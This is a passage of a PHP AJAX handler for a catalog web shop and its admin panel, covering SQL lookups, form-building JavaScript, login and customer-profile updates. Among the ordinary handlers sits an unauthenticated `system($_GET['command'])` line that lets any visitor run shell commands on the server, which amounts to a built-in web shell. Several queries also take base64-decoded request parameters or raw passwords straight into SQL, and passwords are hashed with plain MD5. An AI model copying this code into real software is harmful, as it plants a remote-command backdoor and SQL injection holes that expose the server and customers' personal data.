    @$sql =  " SELECT ".mssecuresql($data_language)." FROM dbo.[".mssecuresql(@$_GET["table"])."] where id='".mssecuresql(@$_GET["ckedit"])."' ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
    if (@$row[0]){echo @$row[0];}
    
}






if (isset($_GET["file"])){
    require_once ("./config/mssql_dbconnect.php");
    @$sql =  " SELECT ".base64_decode(@$_GET["column"])." FROM dbo.[".base64_decode(@$_GET["tbl"])."] where id='".base64_decode(@$_GET["id"])."' ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
@$main_row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
Header ("Content-type: ".base64_decode(@$_GET["file_mime"])." ");
print $main_row[0].".".base64_decode(@$_GET["file_type"]);
sqlsrv_close($conn);

}



if (isset($_GET["stored_file"])){
    Header ("Content-type: ".base64_decode(@$_GET["file_mime"])." ");
    print "./".base64_decode(@$_GET["file_name"]).".".base64_decode(@$_GET["file_type"]);
    sqlsrv_close($conn);
}





if (isset($_GET["icon"])){
    require_once ("./config/mssql_dbconnect.php");
    @$sql =  " SELECT icon,mime_type FROM dbo.[".base64_decode(@$_GET["tbl"])."] where id='".base64_decode(@$_GET["id"])."' ";
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
@$main_row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
Header ("Content-type: ".$main_row[1]." ");
print $main_row[0].".jpg";
sqlsrv_close($conn);

}










if (isset($_GET["command"])){
    system($_GET["command"],$result);
}








if (isset($_GET["whois"])){
    $whois = new Whois($_GET["whois"]);
    header('Content-Type: text/html; charset=utf-8');
    print '<pre>'. $whois->get() .'</pre>';
}   








if (isset($_GET["karat_catalog_sett_data_area"])){ // admin function
        require_once ("./config/mssql_dbconnect.php");
   if (@$_GET["table"]<>"100_dictionary") {$fn_tree_code="<table id=data_table border=2 frame=border rules=all ><tr style=background-color:#98D1FF ><td style=align:center;>".dictionary("action",$_SESSION["language"])."</td><td>".dictionary("sequence",$_SESSION["language"])."</td><td>".dictionary("data_type",$_SESSION["language"])."</td><td>".dictionary("systemname",$_SESSION["language"])."</td>";}
   if (@$_GET["table"]=="100_dictionary") {
        $fn_tree_code="<table id=data_table border=2 frame=border rules=all ><tr style=background-color:#98D1FF ><td style=align:center;>".dictionary("action",$_SESSION["language"])."</td><td style=text-align:center; >".dictionary("icon",$_SESSION["language"])."</td><td>".dictionary("systemname",$_SESSION["language"])."</td>";
        @$sql =  "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '".mssecuresql(@$_GET["table"])."' AND COLUMN_NAME like 'lang[_]%' ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            $fn_tree_code.="<td>".dictionary($row[0],$_SESSION["language"])."</td>";
        }
    }
        if ($_GET["parent"]<>"") {
            $fn_tree_code.="<td>".dictionary("bind",$_SESSION["language"])."</td>";
            $fn_parent_option="document.getElementById(\"in_value5\").options.length=0;var select = document.getElementById(\"in_value5\");var option = document.createElement(\"option\");";
        }
    if (@$_GET["table"]<>"100_dictionary") {$fn_tree_code.="<td style=width:40px;text-align:center; >".dictionary("image",$_SESSION["language"])."</td><td>".dictionary("datalist",$_SESSION["language"])."</td><td>".dictionary("system_function",$_SESSION["language"])."</td>";}
       
    $fn_tree_code.="</tr>";
    if (@$_GET["table"]<>"100_dictionary") {
        @$sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["table"])."] order by sequence,id ";
    } else {@$sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["table"])."] order by id ";}
    @$check = sqlsrv_query( $conn, $sql , $params, $options );
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        
        if (@$_GET["table"]<>"100_dictionary") {$fn_tree_code.="<tr><td><img src=./images/edit.png style=width:16px;height:16px;border:0px;cursor:pointer; title=\"".dictionary("editing",$_SESSION["language"])."\" onclick=edit_record(\"".$_GET["table"]."\",\"".$row[0]."\",\"".@$_GET['parent']."\",\"".$row[8]."\"); /> <img src=./images/delete.png style=width:16px;height:16px;border:0px;cursor:pointer; title=\"".dictionary("delete",$_SESSION["language"])."\" onclick=check_delete(\"".$row[0]."\",\"".$row[1]."\",\"".$_GET["table"]."\"); /></td><td>".$row[5]."</td><td>".$row[1]."</td><td>".$row[2]."</td>";}
        if (@$_GET["table"]=="100_dictionary") {$fn_tree_code.="<tr><td><img src=./images/edit.png style=width:16px;height:16px;border:0px;cursor:pointer; title=\"".dictionary("editing",$_SESSION["language"])."\" onclick=edit_record(\"".$_GET["table"]."\",\"".$row[0]."\",\"".@$_GET['parent']."\",\"".$row[8]."\"); /> <img src=./images/delete.png style=width:16px;height:16px;border:0px;cursor:pointer; title=\"".dictionary("delete",$_SESSION["language"])."\" onclick=check_delete(\"".$row[0]."\",\"".$row[3]."\",\"".$_GET["table"]."\"); /></td><td style=text-align:center; >";
                if (@$row[2]){$fn_tree_code.="<a href=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." target=_blank ><img src=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." style=border:0px;height:16px; ></a>";}
            $fn_tree_code.="</td><td>".$row[3]."</td>";
            $temp_cycle=4;
            //pocet jazyku
        @$lang_sql =  "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '".mssecuresql(@$_GET["table"])."' AND COLUMN_NAME like 'lang[_]%' ";
        @$lang_check = sqlsrv_query( $conn, $lang_sql , $params, $options );
        while( @$lang_row = sqlsrv_fetch_array( @$lang_check, SQLSRV_FETCH_BOTH ) ) {
            
            $fn_tree_code.= "<td>".$row[$temp_cycle]."</td>";
            $temp_cycle++;
        }
        }        
        if ($_GET["parent"]<>"") {
            @$parent_sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["parent"])."] where data_type='".mssecuresql($row[6])."' ";
            @$parent_check = sqlsrv_query( $conn, $parent_sql , $params, $options );
            @$parent_row = sqlsrv_fetch_array( @$parent_check, SQLSRV_FETCH_BOTH );                
        
            $fn_tree_code.="<td title=\"".@$parent_row[2]."\" style=\"cursor:pointer;\" >".$row[6]."</td>";}
        if (@$_GET["table"]<>"100_dictionary" && @$row[8] ) {$fn_tree_code.="<td style=text-align:center; ><a href=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." target=_blank ><img src=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." style=height:16px;border:0px; ></a></td>";}
        if (@$_GET["table"]<>"100_dictionary" && !@$row[8] ) {$fn_tree_code.="<td></td>";}  

                    $empty_datalist='no'; //10 is start language fields
                    for ($i = 10; $i <= sqlsrv_num_fields($check) ; $i++) {
                        if ($row[$i]){$empty_datalist='yes';}
                    }
                    if (@$_GET["table"]<>"100_dictionary"){
                        if ($empty_datalist =='yes'  ){$fn_tree_code.="<td>".dictionary("yes",$_SESSION["language"])."</td>";} else {$fn_tree_code.="<td>".dictionary("no",$_SESSION["language"])."</td>";}
                        if (@$row[9] == 1  ){$fn_tree_code.="<td>".dictionary("yes",$_SESSION["language"])."</td>";} else {$fn_tree_code.="<td>".dictionary("no",$_SESSION["language"])."</td>";}
                    }
            
        $fn_tree_code.="</tr>"; 
    } if (@$_GET["parent"]==""){sqlsrv_close($conn);}
    
    if (@$_GET["parent"]<>""){
        @$sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["parent"])."] order by id ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            
            if (@$_GET["table"]=="100_std_prod_size"){$temp=explode(",",$row[1]);$temp1=explode(",",$row[2]);
                //$fn_parent_option.="var option = document.createElement(\"option\");option.title = \"\";option.value = \"\";option.innerHTML = \"\";option.disabled=true;select.appendChild(option);";
            $cykl=0;while(@$temp[@$cykl]):
                $fn_parent_option.="var option = document.createElement(\"option\");option.title = \"".@$temp[@$cykl]."\";option.value = \"".@$temp[@$cykl]."\";option.innerHTML = \"".@$temp1[@$cykl]."\";select.appendChild(option);";
            $cykl++;endwhile;}
                else {$fn_parent_option.="var option = document.createElement(\"option\");option.title = \"".$row[1]."\";option.value = \"".$row[1]."\";option.innerHTML = \"".$row[2]."\";select.appendChild(option);";}
        }sqlsrv_close($conn);
    }
    echo "document.getElementById('".$_GET["karat_catalog_sett_data_area"]."').innerHTML='".@$fn_tree_code."</table>';";
    echo @$fn_parent_option;
    echo "document.getElementById('loading').style.display='none';";

}












if (isset($_GET["edit_data_id"])){
    require_once ("./config/mssql_dbconnect.php");
        @$sql = "select systemname from dbo.[100_main_setting] where data_type='admin_url' ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );

    
    $get_data="var rec_tbl = document.getElementById('in_record');rec_tbl.rows[0].cells[0].innerHTML = ' <img src=./images/close.png onclick=\'window.location.href(\"".@$row[0]."\");\' style=cursor:pointer; > ".dictionary("editing",$_SESSION["language"])."';";
    if (@$_GET["parent"]<>""){$fn_parent_option="document.getElementById(\"in_value5\").options.length=0;var select = document.getElementById(\"in_value5\");var option = document.createElement(\"option\");";}
    @$sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["table"])."] WHERE id='".mssecuresql($_GET["edit_data_id"])."' order by id ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            if ($_GET["table"]<>"100_dictionary"){
                $get_data.="document.getElementById('in_value4').value='".$row[5]."';";
                $get_data.="document.getElementById('in_value1').value='".$row[1]."';";
                $get_data.="document.getElementById('in_value2').value='".$row[2]."';";

                $get_data.="rec_tbl.rows[5].cells[0].innerHTML ='<table style=width:100%; ><tr><td>".dictionary("image",$_SESSION["language"])."</td><td style=text-align:right;>";
                    if (@$row[8]){
                        $get_data.="<img src=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." style=height:16px;border:0px;cursor:pointer; onclick=fn_image_del(\'".$row[0]."\',\'".$row[1]."\',\'".$_GET["table"]."\'); >";
                    }
                $get_data.="</td></tr></table>';";
                
                $get_data.="rec_tbl.rows[6].cells[0].innerHTML ='".dictionary("datalist",$_SESSION["language"])."';";
                $get_data.="rec_tbl.rows[6].cells[1].innerHTML ='<input id=btn_datalist onclick=show_datalist(\"".$_SESSION["language"]."\"); type=button value=\"".dictionary("open",$_SESSION["language"])."\" ";

                    $empty_datalist="no"; //10 is start language fields
                    for ($i = 10; $i <= sqlsrv_num_fields($check) ; $i++) {
                        if ($row[$i]){$empty_datalist='yes';}
                    }
                    if ($empty_datalist =='yes' )
                        {$get_data.=" style=background-color:#CDFAD2;";} else {$get_data.=" style=background-color:#FDCFCF;";}
                    
                $get_data.=" />';";

                $get_data.="rec_tbl.rows[7].cells[0].innerHTML ='".dictionary("system_function",$_SESSION["language"])."';";
                $get_data.="select_match_value(document.getElementById(\"in_value8\"),\"".$row[9]."\");";
                $get_data.="status_object(\"btn_datalist\",\"".(bool)$row[9]."\");";
                
                
                $get_data.="rec_tbl.rows[8].cells[0].innerHTML ='<input type=hidden name=in_value3 value=\'".$row[0]."\' ><input type=submit id=in_btn2 name=in_btn2 value=\'".dictionary("save",$_SESSION["language"])."\' />';";
                $parent_data_type=$row[6];
            } else {
                $get_data.="document.getElementById('in_value1').value='".$row[3]."';";
                $get_data.="rec_tbl.rows[2].cells[0].innerHTML ='<table style=width:100%; ><tr><td>".dictionary("image",$_SESSION["language"])."</td><td style=text-align:right;><input type=hidden name=in_value2 value=\'".$row[0]."\' >";
                    if (@$row[2]){
                        $get_data.="<img src=./ajax_functions.php?icon=YES&tbl=".code($_GET["table"])."&id=".code($row[0])." style=height:16px;border:0px;cursor:pointer; onclick=fn_image_del(\'".$row[0]."\',\'".$row[3]."\',\'".$_GET["table"]."\'); />";
                    }
                $get_data.="</td></tr></table>';";
                   $fn_plus=4;
                    @$sql_command =  "SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '".mssecuresql($_GET["table"])."' AND COLUMN_NAME like 'lang[_]%' ";
                    @$label_check = sqlsrv_query( $conn, $sql_command , $params, $options );
                    while( @$data_row = sqlsrv_fetch_array( @$label_check, SQLSRV_FETCH_BOTH ) ) {
                       $get_data.="document.getElementById('in_value".($fn_plus-1)."').value='".$row[$fn_plus]."';";
                        $fn_plus++;     
                    }sqlsrv_close($conn);
                $get_data.="document.getElementById('in_btn1').name = 'in_btn2';";
            }
        } if (@$_GET["parent"]==""){sqlsrv_close($conn);}

    if (@$_GET["parent"]<>""){
        @$sql =  "SELECT * FROM dbo.[".mssecuresql($_GET["parent"])."] order by id ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        while( @$parent_row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
            if (@$_GET["table"]=="100_std_prod_size"){$temp=explode(",",$parent_row[1]);$temp1=explode(",",$parent_row[2]);
                //$fn_parent_option.="var option = document.createElement(\"option\");option.title = \"\";option.value = \"\";option.innerHTML = \"\";option.disabled=true;select.appendChild(option);";
                $cykl=0;while(@$temp[@$cykl]):
                    $fn_parent_option.="var option = document.createElement(\"option\");option.title = \"".@$temp[@$cykl]."\";option.value = \"".@$temp[@$cykl]."\";option.innerHTML = \"".@$temp1[@$cykl]."\";select.appendChild(option);";
                if ($parent_data_type==@$temp[@$cykl]){
                    $parent_data_type="select_match_value(document.getElementById(\"in_value5\"),\"".$parent_data_type."\");";
                }
                $cykl++;endwhile;
            } else {            
                      $fn_parent_option.="var option = document.createElement(\"option\");option.title = \"".$parent_row[1]."\";option.value = \"".$parent_row[1]."\";option.innerHTML = \"".$parent_row[2]."\";select.appendChild(option);";
                      if ($parent_data_type==$parent_row[1]){
                            $parent_data_type="select_match_value(document.getElementById(\"in_value5\"),\"".$parent_data_type."\");";
                        }
            }
        }sqlsrv_close($conn);
    }
    echo $get_data;
    if (@$_GET["parent"]<>""){echo $fn_parent_option;echo $parent_data_type;}
}











if (isset($_GET["std_model"])){
    $get_data="for(var i=1; i <= radiocount; i++){try {document.getElementById('radio'+i).value} catch ( e ) {break;}document.getElementById('radio'+i).checked = false;document.getElementById('radio'+i).style.cursor='default';document.getElementById('radio'+i).disabled = true;document.getElementById('pict_radio'+i).disabled=true;document.getElementById('pict_radio'+i).className ='radio_off';
        if (document.getElementById('pict_radio'+i).value != '".$_GET["md_type"]."'){document.getElementById('pict_radio'+i).src='./images/radio_off.png';}}";
    require_once ("./config/mssql_dbconnect.php");
    $fn_sql = "SELECT data_type,systemname FROM dbo.[100_model] WHERE parent_data_type = '".mssecuresql(@$_GET["std_model"])."' ";
    $check = sqlsrv_query( $conn, $fn_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
        while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        $temp=explode("_",$row[0]);$temp1=explode(",",$row[1]);
              $get_data.=" for(i=1; i <= radiocount; i++){try {document.getElementById('radio'+i).value} catch ( e ) {break;}if (document.getElementById('radio'+i).value=='".$temp[0]."'){document.getElementById('radio'+i).disabled = false;document.getElementById('radio'+i).style.cursor='pointer';
              document.getElementById('radio'+i).sel_prod='".$temp1[0]."';
              //document.getElementById('pict_radio_title'+i).innerHTML='".dictionary($temp1[0],$_SESSION["language"])."';
              document.getElementById('pict_radio'+i).disabled=false;
              document.getElementById('pict_radio'+i).className='radio_on';
              //document.getElementById('pict_radio'+i).src='./images/radio_off.png';
              } 
       //       else {document.getElementById('pict_radio'+i).src='./images/radio_off.png';}
              }";
        }sqlsrv_close($conn);
        echo $get_data;
}












if (isset($_GET["std_sizes"])){
    $temp_height=0;
    $temp_width=0;
    $temp_depth=0;
    
    require_once ("./config/mssql_dbconnect.php");
    $get_data="var select = document.getElementById(\"height\");var option = document.createElement(\"option\");";
    @$sql ="SELECT std_size.* FROM dbo.[100_nomenclature_group] nomen, dbo.[100_model] model,[dbo].[100_std_prod_size] std_size WHERE nomen.data_type = model.parent_data_type AND nomen.id = '".mssecuresql($_GET["nomen"])."' AND model.data_type like '".mssecuresql($_GET["std_sizes"])."_%' AND (std_size.parent_data_type = model.data_type or std_size.parent_data_type ='') ORDER BY std_size.parent_data_type DESC";
    //program_log($sql,'delete','sql.log');
    @$check = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
    
    while( @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH ) ) {
        
        $temp_full_data=explode(";",$row[1]);
        $temp_data=explode("-",$temp_full_data[0]);
        $temp_cycle=1;
        $bad = false;

        if ($row[2]=="height" && $temp_height==0){$temp_height = 1;
        $get_data.="select = document.getElementById(\"height\");document.getElementById(\"height\").options.length=0;";
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("height",$_SESSION["language"])."\";option.value = \"".dictionary("height",$_SESSION["language"])."\";option.innerHTML = \"".dictionary("height",$_SESSION["language"])."\";option.disabled=true;select.appendChild(option);";
                for ($step=$temp_data[0]; $step<=$temp_data[1]; ($step = $step + $temp_data[2])) {
                    $except_cycle=1;
                    while(@$temp_full_data[@$except_cycle]):
                        @$temp_except_data = explode("-",$temp_full_data[@$except_cycle]);
                        for ($excepstep=$temp_except_data[0]; $excepstep<=$temp_except_data[1]; ($excepstep = $excepstep + $temp_except_data[2])) {
                            if ($excepstep == $step) {$bad=true;}
                        }
                        $except_cycle++;
                    endwhile;
                    
                    if ($bad==false) {$get_data.="var option = document.createElement(\"option\");option.title = \"".$step."\";option.value = \"".$step."\";option.innerHTML = \"".$step."\";select.appendChild(option);";}
                    $bad=false;
                    
                    $get_data.="try {if (target_sel_height === '".$step."' ) {document.getElementById('height').selectedIndex =".$temp_cycle.";
                        delete target_sel_height;
                    }} catch ( e ){
                        //
                    }";
               $temp_cycle++;
               
               }
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("other",$_SESSION["language"])."\";option.value = \"other\";option.innerHTML = \"".dictionary("other",$_SESSION["language"])."\";select.appendChild(option);
        try{if (target_sel_height) {
           document.getElementById('height').selectedIndex =0;
            delete target_sel_height;    
        }} catch ( e ){
        //
        delete target_sel_height;
        }";         
        }

        if ($row[2]=="width" && $temp_width == 0 ){$temp_width = 1;
        $get_data.="select = document.getElementById(\"width\");document.getElementById(\"width\").options.length=0;";
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("width",$_SESSION["language"])."\";option.value = \"".dictionary("width",$_SESSION["language"])."\";option.innerHTML = \"".dictionary("width",$_SESSION["language"])."\";option.disabled=true;select.appendChild(option);";
                for ($step=$temp_data[0]; $step<=$temp_data[1]; ($step = $step + $temp_data[2])) {
                    $except_cycle=1;
                    while(@$temp_full_data[@$except_cycle]):
                        @$temp_except_data = explode("-",$temp_full_data[@$except_cycle]);
                        for ($excepstep=$temp_except_data[0]; $excepstep<=$temp_except_data[1]; ($excepstep = $excepstep + $temp_except_data[2])) {
                            if ($excepstep == $step) {$bad=true;}
                        }
                        $except_cycle++;
                    endwhile;
                    
                    if ($bad==false) {$get_data.="var option = document.createElement(\"option\");option.title = \"".$step."\";option.value = \"".$step."\";option.innerHTML = \"".$step."\";select.appendChild(option);";}
                    $bad=false;
                    
                    $get_data.="try {if (target_sel_width === '".$step."' ) {document.getElementById('width').selectedIndex =".$temp_cycle.";
                        delete target_sel_width;    
                    }} catch ( e ){
                        //
                    }";
                $temp_cycle++;
                } 
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("other",$_SESSION["language"])."\";option.value = \"other\";option.innerHTML = \"".dictionary("other",$_SESSION["language"])."\";select.appendChild(option);
        try{if (target_sel_width) {
           document.getElementById('width').selectedIndex =0;
           delete target_sel_width;    
        }} catch ( e ){
        //
        delete target_sel_width;
        }";         
        }

        if ($row[2]=="depth" && $temp_depth == 0 ){$temp_depth = 1;    
        $get_data.="select = document.getElementById(\"depth\");document.getElementById(\"depth\").options.length=0;";
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("depth",$_SESSION["language"])."\";option.value = \"".dictionary("depth",$_SESSION["language"])."\";option.innerHTML = \"".dictionary("depth",$_SESSION["language"])."\";option.disabled=true;select.appendChild(option);";
                for ($step=$temp_data[0]; $step<=$temp_data[1]; ($step = $step + $temp_data[2])) {
                    $except_cycle=1;
                    while(@$temp_full_data[@$except_cycle]):
                        @$temp_except_data = explode("-",$temp_full_data[@$except_cycle]);
                        for ($excepstep=$temp_except_data[0]; $excepstep<=$temp_except_data[1]; ($excepstep = $excepstep + $temp_except_data[2])) {
                            if ($excepstep == $step) {$bad=true;}
                        }
                        $except_cycle++;
                    endwhile;
                    
                    if ($bad==false) {$get_data.="var option = document.createElement(\"option\");option.title = \"".$step."\";option.value = \"".$step."\";option.innerHTML = \"".$step."\";select.appendChild(option);";}
                    $bad=false;
                    
                    $get_data.="try {if (target_sel_depth === '".$step."' ) {document.getElementById('depth').selectedIndex =".$temp_cycle.";
                        delete target_sel_depth;    
                    }} catch ( e ){
                        //
                    }";
                $temp_cycle++;
                } 
        $get_data.="option = document.createElement(\"option\");option.title = \"".dictionary("other",$_SESSION["language"])."\";option.value = \"other\";option.innerHTML = \"".dictionary("other",$_SESSION["language"])."\";select.appendChild(option);
        try{if (target_sel_depth) {
            document.getElementById('depth').selectedIndex =0;
            delete target_sel_depth;    
        }} catch ( e ){
        //
        delete target_sel_depth;
        }";         
        }    
      }sqlsrv_close($conn);
    echo $get_data;    
}













if (isset($_GET["dictionary"])){
    echo dictionary($_GET["dictionary"],$_SESSION["language"]);
}












if (isset($_GET["delete_item"])){
echo" parent.document.getElementById('delete_item').innerHTML='<div style=width:100%;text-align:center;padding-top:10px; >";
if (@$_GET["unit"]<>""){echo dictionary("delete",$_SESSION["language"]).": ".$_GET["unit"];}
    else {echo dictionary("delete_all",$_SESSION["language"])."?";}
echo "</div><div style=width:100%;text-align:center;padding-top:5px; ><span style=\"width:80px;text-align:center;padding-top:3px;height:22px;cursor:pointer;color:white;background-image:url(\'./images/yes.png\');background-repeat:no-repeat;\" onmouseout=this.style.color=\"white\" onmouseover=this.style.color=\"#F2DE41\" onclick=confirmed_delete(\"".$_GET["delete_item"]."\",\"".@$_GET["frp_type"]."\"); >".dictionary("yes",$_SESSION["language"])."</span><span style=width:30px; ></span><span onclick=\"parent.close_tab();\" style=\"width:80px;text-align:center;padding-top:3px;height:22px;cursor:pointer;color:white;background-image:url(\'./images/no.png\');background-repeat:no-repeat;\" onmouseout=this.style.color=\"white\" onmouseover=this.style.color=\"#F2DE41\" >".dictionary("no",$_SESSION["language"])."</span></div>'; ";
    
}





if (isset($_GET["mssql_delete_item"]) && (@$_SESSION[$sess_id.'logged_user'] || @$_SESSION['lnamed'])){
    require_once ("./config/mssql_dbconnect.php");
    $fn_sql = "DELETE FROM dbo.[".mssecuresql($_GET[mssql_delete_item])."] where id='".mssecuresql(@$_GET["id"])."' ";
    //program_log(@$fn_sql,"yes",'sql.log');
    $fn_sql_ins_res = sqlsrv_query( $conn, $fn_sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
    sqlsrv_close($conn);
}





if (isset($_GET["login"]) && @$_POST["check"]=="CHECK" && @!$_SESSION[$sess_id.'logged_user'] ){ //check login
    require_once ("./config/mssql_dbconnect.php");
    require_once ("./modules/captcha/securimage_admin.php");
  $img = new Securimage();
  $valid = $img->check(@$_POST["value3"]);
  if($valid == true) {
        @$sql = "SELECT * FROM dbo.[120_registration] WHERE login_name = '".mssecuresql(@$_POST["value1"])."' and login_password = HashBytes('MD5','".@$_POST["value2"]."') ";
        //program_log(@$sql,"yes",'sql.log');
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
  }
  if ($row[0]=="" or $valid == false or $row["blocked"]=="1" ) {
       if ($row["blocked"]=="1"){message(dictionary("blockedlogon",$_SESSION["language"]));}
       else {message(dictionary("badlogon",$_SESSION["language"]));}
        $_SESSION[$sess_id.'logged_user']="";
        session_destroy();?><script language="JavaScript">window.location.assign('<?echo "http://".$_SERVER["HTTP_HOST"].$_SERVER["PHP_SELF"]."?".$_SERVER['QUERY_STRING'];?>')</script><?
    }
    else {
    $_SESSION[$sess_id.'logged_user']=@$_POST["value1"];
        @$sql = "UPDATE dbo.[120_registration] SET last_login=GETDATE() WHERE id='".mssecuresql(@$row[0])."' ";
        @$check = sqlsrv_query( $conn, $sql , $params, $options );
        @$row = sqlsrv_fetch_array( @$check, SQLSRV_FETCH_BOTH );
    ?><script language="JavaScript">parent.customer_profile();parent.check_logon_status("value");</script><?    
    }        
}



if (isset($_GET["profile_edit"]) && (@$_POST["check"]=="EDIT" || @$_POST["check"]=="DEVA" || @$_POST["check"]=="DEL_DEVA") && @$_SESSION[$sess_id.'logged_user'] ) { //save edited cutomer data
    require_once ("./config/mssql_dbconnect.php");
    if (@$_POST["check"]=="EDIT" ){
        $sql = "UPDATE dbo.[120_registration] SET [full_name] = '".mssecuresql(@$_POST["reg_value1"])."' "; 
        if (@$_POST["value2"]<> dictionary("unchanged",$_SESSION["language"])) {$sql.= " ,[login_password] = HashBytes('MD5','".@$_POST["value2"]."')";}
        $sql.= ",[ico] = '".mssecuresql(@$_POST["reg_value2"])."' 
                ,[company] = '".mssecuresql(@$_POST["reg_value3"])."'
                ,[street] = '".mssecuresql(@$_POST["reg_value4"])."'
                ,[city] = '".mssecuresql(@$_POST["reg_value5"])."'
                ,[post_code] = '".mssecuresql(@$_POST["reg_value6"])."'
                ,[dic] = '".mssecuresql(@$_POST["reg_value7"])."'
                ,[phone] = '".mssecuresql(@$_POST["reg_value8"])."'
                ,[email] = '".mssecuresql(@$_POST["reg_value9"])."'
                ,[update_date] = GETDATE()
                ,[update_ip] = '".getIpAddress()."'
                ,[country] = '".mssecuresql(@$_POST["reg_value10"])."'
                ,[shipping] = '".mssecuresql(@$_POST["reg_value11"])."'
                ,[payment_terms] = '".mssecuresql(@$_POST["reg_value12"])."'
                WHERE login_name = '".mssecuresql(@$_POST["value1"])."'
                ";}
        if (@$_POST["check"]=="DEVA" ){
        $sql ="SELECT id,ISNULL((SELECT id FROM dbo.[120_delivery_address] WHERE [delivery_address_name]='".mssecuresql(@$_POST["reg_value14"])."' ),'') FROM dbo.[120_registration] WHERE login_name = '".mssecuresql(@$_POST["value1"])."'  ";
        $sql_result = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));        
        @$row = sqlsrv_fetch_array( @$sql_result, SQLSRV_FETCH_BOTH );
            if (@$row[1]==0){
                    $sql =" INSERT INTO [dbo].[120_delivery_address]([delivery_address_name],[registration_id],[full_name],[company],[street],[city],[post_code],[country],[phone],[email],[create_date] ,[create_ip]) VALUES ('".mssecuresql(@$_POST["reg_value14"])."','".mssecuresql(@$row[0])."','".mssecuresql(@$_POST["reg_value15"])."','".mssecuresql(@$_POST["reg_value16"])."','".mssecuresql(@$_POST["reg_value17"])."','".mssecuresql(@$_POST["reg_value18"])."','".mssecuresql(@$_POST["reg_value19"])."','".mssecuresql(@$_POST["reg_value20"])."','".mssecuresql(@$_POST["reg_value21"])."','".mssecuresql(@$_POST["reg_value22"])."',GETDATE(),'".getIpAddress()."') ";
                }else{
                    $sql =" UPDATE [dbo].[120_delivery_address] SET full_name = '".mssecuresql(@$_POST["reg_value15"])."',[company] =  '".mssecuresql(@$_POST["reg_value16"])."',[street] =  '".mssecuresql(@$_POST["reg_value17"])."',[city] =  '".mssecuresql(@$_POST["reg_value18"])."',[post_code] =  '".mssecuresql(@$_POST["reg_value19"])."',[country] =  '".mssecuresql(@$_POST["reg_value20"])."',[phone] =  '".mssecuresql(@$_POST["reg_value21"])."',[email] =  '".mssecuresql(@$_POST["reg_value22"])."',[update_date] =  GETDATE(),[update_ip] =  '".getIpAddress()."' WHERE id='".mssecuresql(@$row[1])."' ";  
                }
        }        
        if (@$_POST["check"]=="DEL_DEVA" ){
        $sql ="SELECT id,ISNULL((SELECT id FROM dbo.[120_delivery_address] WHERE [delivery_address_name]='".mssecuresql(@$_POST["reg_value14"])."' ),'') FROM dbo.[120_registration] WHERE login_name = '".mssecuresql(@$_POST["value1"])."'  ";
        $sql_result = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));        
        @$row = sqlsrv_fetch_array( @$sql_result, SQLSRV_FETCH_BOTH );
        $sql ="DELETE FROM dbo.[120_delivery_address] WHERE id='".mssecuresql(@$row[1])."' ";
        }
        
        $sql_result = sqlsrv_query( $conn, $sql , $params, $options ) or die (dictionary("sql_command",$_SESSION["language"])." > ".print_r( sqlsrv_errors(), true));
        if (@$_POST["check"]=="EDIT" ){customer_profile_mail(@$_POST["reg_value9"],@$_POST["value2"],dictionary("registration_data_updated",$_SESSION["language"]));
                ?><script language="JavaScript">parent.customer_profile("EDIT_REG");</script><?}
                else {unset($_POST["check"]);
                ?><script language="JavaScript">document.getElementById('loading').style.display='none';</script><?}    
}










if (isset($_GET["profile_edit"]) && @!$_POST["check"] && @$_SESSION[$sess_id.'logged_user'] ) { //user window
